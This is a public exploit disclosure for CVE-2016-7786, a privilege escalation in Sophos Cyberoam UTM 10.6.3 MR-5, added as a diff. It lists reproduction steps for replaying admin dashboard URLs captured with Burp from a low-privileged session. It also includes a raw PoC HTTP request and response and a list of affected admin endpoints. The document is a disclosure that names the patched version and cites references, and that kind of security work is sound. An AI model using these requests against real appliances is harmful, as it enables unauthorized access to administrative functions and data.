@@ -1,0 +1,80 @@
+# Exploit Title: Sophos Cyberoam UTM - Privilege Escalation
+# Date: 31/08/2016
+# Exploit Author: Chintan Gurjar (Frogy)
+# Vendor Homepage: http://www.sophos.com/
+# Software Link: https://www.cyberoam.com/downloads/datasheet/CR25iNG.html
+# Version: Cyberoam CR25iNG - 10.6.3 MR-5
+# CVE : CVE-2016-7786
+# Category : Webapps
+# CVSS Score: 9.3
+
+Description
+===========
+A vulnerability, which was classified as critical, has been found in Sophos Cyberoam UTM CR25iNG 10.6.3 MR-5. This issue affects an unknown function of the file Licenseinformation.jsp of the component Access Restriction. The manipulation with an unknown input leads to a privilege escalation vulnerability. Using CWE to declare the problem leads to CWE-264. Impacted are confidentiality, integrity, and availability.
+The weakness was released 04/07/2017. The advisory is shared for download at infosecninja.blogspot.in. The identification of this vulnerability is CVE-2016-7786 since 09/09/2016. The attack may be initiated remotely. The successful exploitation needs a single authentication. Technical details of the vulnerability are known.
+Upgrading to version 10.6.5 eliminates this vulnerability.
+
+Steps to reproduce
+===================
+1. Login with admin user account.
+2. Navigate to the dashboard and observe all GET URLs through burp proxy. Save URLs.
+3. Logout and login with a low privileged user account who does not have even read/write/execution permission.
+4. Access saved admin functionality URLs with a low privileged user account.
+5. Access the admin information from the user account.
+
+Video Demonstration
+====================
+https://www.youtube.com/watch?v=unV3-DdIxXw&t=2s
+
+
+PoC
+===============
+Request:
+
+GET /corporate/webpages/dashboard/LicenseInformation.jsp HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;1=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.1/corporate/webpages/index.php
+Cookie: JSESSIONID=120g9lzj467ivba7uvbf9ej73
+Connection: close
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Wed, 31 Aug 2016 06:59:56 GMT
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html;charset=UTF-8
+Cache-Control: max-age=2592000
+Expires: Fri, 30 Sep 2016 06:59:56 GMT
+Vary: Accept-Encoding
+Content-Length: 1828
+Connection: Close
+
+...
+
+<table width="100%" cellpading="1" cellspacing="1">
+<tr>
+<td class="tableheader_gadget" align="center"><label
+id='Language.Time'></label></td>
+<td class="tableheader_gadget" align="center"><label
+id='Language.User'></label></td>
+...
+
+Affected URLs
+===============
+http://192.168.1.1/corporate/webpages/dashboard/ApplianceInformation.jsp
+http://192.168.1.1/corporate/webpages/dashboard/IPSRecentAlerts.jsp
+http://192.168.1.1/corporate/webpages/dashboard/HTTPVirusDetected.jsp
+...Many others...
+
+
+References
+===============
+https://infosecninja.blogspot.co.nz/2017/04/cve-2016-7786-sophos-cyberoam-utm.html
+https://vuldb.com/?id.99371
+https://www.cvedetails.com/cve/CVE-2016-7786/
+https://nvd.nist.gov/vuln/detail/CVE-2016-7786
